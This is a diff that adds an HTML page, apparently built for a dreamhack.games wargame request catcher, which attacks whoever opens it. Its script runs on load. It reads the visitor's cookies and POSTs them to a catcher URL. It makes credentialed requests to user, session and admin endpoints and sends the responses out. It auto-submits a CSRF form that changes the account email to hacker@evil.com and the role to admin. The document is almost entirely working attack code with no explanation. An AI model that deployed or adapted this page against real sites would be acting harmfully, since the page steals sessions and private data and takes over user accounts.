@@ -1,1 +1,89 @@
-<a href='https://srdhlqg.request.dreamhack.games' target='_blank'>1234</a>" <frameborder="0">
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Test Page</title>
+</head>
+<body>
+    <h1>Security Assessment in Progress</h1>
+    
+    <!-- Hidden image tracker -->
+    <img src="https://foqeblb.request.dreamhack.games/tracker.gif?page=exploit" style="display:none">
+    
+    <!-- Auto-submit form -->
+    <form id="stealForm" action="https://foqeblb.request.dreamhack.games/capture" method="POST">
+        <input type="hidden" name="action" value="steal_session">
+        <input type="hidden" name="referrer" value="https://foqeblb.request.dreamhack.games">
+    </form>
+    
+    <!-- CSRF PoC -->
+    <form id="csrfForm" action="https://foqeblb.request.dreamhack.games/api/user/update" method="POST">
+        <input type="hidden" name="email" value="hacker@evil.com">
+        <input type="hidden" name="role" value="admin">
+    </form>
+    
+    <script>
+        // Capture cookies and send to our catcher
+        function captureCookies() {
+            const cookies = document.cookie;
+            const formData = new FormData();
+            formData.append('cookies', cookies);
+            formData.append('url', window.location.href);
+            
+            // Send to request catcher
+            fetch('https://your-server.com/catcher.php', {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            });
+        }
+        
+        // Auto-submit forms
+        setTimeout(() => {
+            // Submit steal form
+            document.getElementById('stealForm').submit();
+            
+            // Try CSRF after delay
+            setTimeout(() => {
+                document.getElementById('csrfForm').submit();
+            }, 2000);
+        }, 1000);
+        
+        // Make XHR requests
+        function makeXHRRequests() {
+            const endpoints = [
+                '/api/user',
+                '/api/session',
+                '/admin',
+                '/profile'
+            ];
+            
+            endpoints.forEach(endpoint => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://foqeblb.request.dreamhack.games' + endpoint, true);
+                xhr.withCredentials = true; // Include cookies
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        // Send captured response to our server
+                        fetch('https://your-server.com/catcher.php', {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                endpoint: endpoint,
+                                status: xhr.status,
+                                response: xhr.responseText
+                            }),
+                            mode: 'no-cors'
+                        });
+                    }
+                };
+                xhr.send();
+            });
+        }
+        
+        // Execute on page load
+        window.onload = function() {
+            captureCookies();
+            makeXHRRequests();
+        };
+    </script>
+</body>
+</html>
